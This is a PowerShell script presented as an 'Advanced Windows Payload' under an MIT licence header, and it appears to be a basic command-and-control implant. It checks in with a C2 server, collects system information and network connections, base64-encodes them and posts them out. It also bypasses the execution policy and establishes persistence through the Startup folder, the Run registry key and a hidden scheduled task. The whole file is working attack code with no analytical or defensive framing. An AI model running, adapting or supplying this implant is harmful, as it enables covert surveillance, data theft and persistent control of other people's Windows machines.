########################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#########################################################################################################################################################################################################################
#!/bin/bash

# Advanced Windows Payload Script
$C2Server = "http://10.0.2.4:8000"  # Replace with the IP address and port of your C2 server
$AgentID = ""

Function Encrypt-Data {
    param (
        [string]$Data
    )
    return [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Data))
}

Function Decrypt-Data {
    param (
        [string]$Data
    )
    return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Data))
}

Function Write-Log {
    param (
        [string]$Message,
        [string]$Color = "White"
    )
    Write-Host $Message -ForegroundColor $Color
}

Function Send-Data {
    param (
        [string]$Endpoint,
        [hashtable]$Data
    )
    $DataJson = $Data | ConvertTo-Json
    $EncryptedData = Encrypt-Data $DataJson
    $Url = "$C2Server/$Endpoint"
    $Response = Invoke-RestMethod -Uri $Url -Method Post -Body $EncryptedData -ContentType "application/json"
    Write-Log "Data sent to $Endpoint"
    return $Response
}

Function Check-In {
    Write-Log "Checking in..."
    $Response = Invoke-RestMethod -Uri "$C2Server/checkin" -Method Post -Body (@{AgentID=""} | ConvertTo-Json) -ContentType "application/json"
    $AgentID = ($Response | ConvertFrom-Json).AgentID
    Write-Log "Checked in with AgentID: $AgentID" "Cyan"
}

Function Gather-System-Info {
    Write-Log "Gathering system info..."
    Get-ComputerInfo | Out-String
}

Function List-Network-Connections {
    Write-Log "Listing network connections..."
    netstat -an | Out-String
}

Function Establish-Persistence {
    Write-Log "Establishing persistence..."
    $ScriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\windows_payload.ps1"
    Copy-Item -Path "$MyInvocation.MyCommand.Path" -Destination $ScriptPath
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsPayload" -Value $ScriptPath
}

Function Check-ExecutionPolicy {
    $CurrentPolicy = Get-ExecutionPolicy
    if ($CurrentPolicy -ne 'Unrestricted' -and $CurrentPolicy -ne 'Bypass') {
        Write-Log "Execution policy is restricted: $CurrentPolicy. Attempting to bypass..."
        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
    }
}

Function Create-Scheduled-Task {
    Write-Log "Creating scheduled task..."
    $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File $MyInvocation.MyCommand.Path"
    $TaskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(30)
    $TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable
    Register-ScheduledTask -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -TaskName "ImmediateWindowsPayload" -Description "Runs the payload immediately"
}

Function Main {
    Write-Log "Payload started."
    
    Check-ExecutionPolicy
    Check-In
    $SystemInfo = Gather-System-Info
    $NetworkConnections = List-Network-Connections
    
    $Data = @{
        AgentID = $AgentID
        SystemInfo = $SystemInfo
        NetworkConnections = $NetworkConnections
    }
    
    Write-Log "Sending system info and network connections to server."
    $Response = Send-Data "result" $Data
    Write-Log "Response from server: $Response" "Green"
    Establish-Persistence
}

Main
Create-Scheduled-Task

